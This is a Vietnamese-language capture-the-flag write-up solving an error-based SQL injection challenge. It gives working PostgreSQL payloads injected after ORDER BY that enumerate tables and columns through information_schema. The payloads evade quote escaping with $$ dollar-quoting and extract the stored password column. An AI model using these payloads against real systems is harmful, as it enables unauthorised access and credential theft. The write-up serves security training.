# Challenge: SQL injection - Error

<img width="1526" height="502" alt="image" src="https://github.com/user-attachments/assets/92a5c293-aef4-4aab-a5e0-501e8aafd551" />

Vào Challenge thì cho một giao diện như vầy 

<img width="389" height="182" alt="image" src="https://github.com/user-attachments/assets/24847b82-7574-403c-8468-12acb61b6df1" />

Thử fuzz vài payload quen thuộc thì nó luôn luôn báo về login failed

<img width="385" height="215" alt="image" src="https://github.com/user-attachments/assets/4e3ab226-173b-4c7a-886e-af45a191b3e2" />

Chuyển qua tab Contents thì thấy ở trên đường dẫn có tham số nhận giá trị từ bên ngoài để hiển thị trang

<img width="1491" height="399" alt="image" src="https://github.com/user-attachments/assets/8d387c95-174d-493b-9804-047c1b566bc6" />

Thử payload thì thấy nó có hiển thị lỗi ra ngoài màn hình , vậy lúc này áp dụng ngay error based

Lưu ý ở đây: Ở sau order by chúng ta không thể dùng thêm OR 1=1 hay Union select gì cả . Nhưng order by lại có kiểu . Giả sử `Order by id , uid` Tức là sắp xếp theo id rồi tiếp tục lại sắp xếp theo một cái í phụ nữa là uid

Trước tiên chúng ta phải làm cho cấu trúc của nó hợp lệ bởi vì Database nó sẽ luôn kiểm tra xem cấu trúc câu truy vấn nó có hợp lệ hay không rồi mới thực hiện . Nếu không thì nó sẽ bỏ qua luôn và báo lỗi , lúc này thì truy vấn vẫn ở nguyên đó 

Vô vấn đề chính , đầu tiên xác định tên bản
payload test
```sql
, CAST((SELECT table_name FROM information_schema.tables) AS INT) ---
```
<img width="1492" height="390" alt="image" src="https://github.com/user-attachments/assets/45de9fde-99f9-4a30-866a-c41461df7172" />

Nhưng nó chỉ còn 1 dòng để in ra kết quả , mà truy vấn có thể là trả về nhiều dòng nên nó báo lỗi v , thêm limit và offset vào
```sql
, CAST((SELECT table_name FROM information_schema.tables limit 1 offset 0) AS INT) ---
```
<img width="1487" height="432" alt="image" src="https://github.com/user-attachments/assets/3a8ed6ae-115d-404f-9d11-0de1c5cdbc68" />

Chúng ta có bảng `m3mbr35t4bl3`

Tiếp theo lấy danh sách cột 
```sql
, CAST((SELECT column_name FROM information_schema.columns where table_name = 'm3mbr35t4bl3' limit 1 offset 0) AS INT) ---
```
<img width="1490" height="760" alt="image" src="https://github.com/user-attachments/assets/cf3be7b3-e59f-440c-84e7-f1a150395442" />

Nhưng nó lại báo lỗi , mình thử dùng hex cũng không được . Đọc kĩ lỗi đó thì thấy cái table_name đang bằng một chuỗi rỗng còn `m3mbr35t4bl3` thì đang ở ngoài dấu nháy đơn kia . Backend đã tự động nhân đôi những chỗ nào chứa nháy đơn , vậy nên mới thành chuỗi rỗng 

Bạn có thể bypass ko dấu nháy bằng cách sử dụng nối chuỗi , rồi thay những kí tự đó bằng mã char , Hoặc nếu không thì có thể sử dụng kí tự `$$   $$` thay cho dấu nháy . Bởi vì hệ quản trị csdl ở đây là Portgresql , bạn có thể phân biệt nhờ vào cách báo lỗi còn không thì có thể suy ra từ câu lệnh lấy tên bảng và việc dùng 0x.... không được thì chỉ có thể là Postgresql

```sql
, CAST((SELECT column_name FROM information_schema.columns where table_name = $$m3mbr35t4bl3$$ limit 1 offset 1) AS INT) ---
```
<img width="1490" height="811" alt="image" src="https://github.com/user-attachments/assets/3a7585ec-8086-4775-a8a6-bd7730c83680" />

Tiếp tục offset 2

<img width="1490" height="351" alt="image" src="https://github.com/user-attachments/assets/d09cfd9a-0a2b-4212-b6d9-c89bdc6c552b" />

`us3rn4m3_c0l` và `p455w0rd_c0l`

payload lấy password
```
, CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 ) AS INT) ---
```

<img width="1492" height="409" alt="image" src="https://github.com/user-attachments/assets/bbd83075-dedb-435a-b3a2-a6f604a40ecc" />

Chúng ta solve được challenge này!!

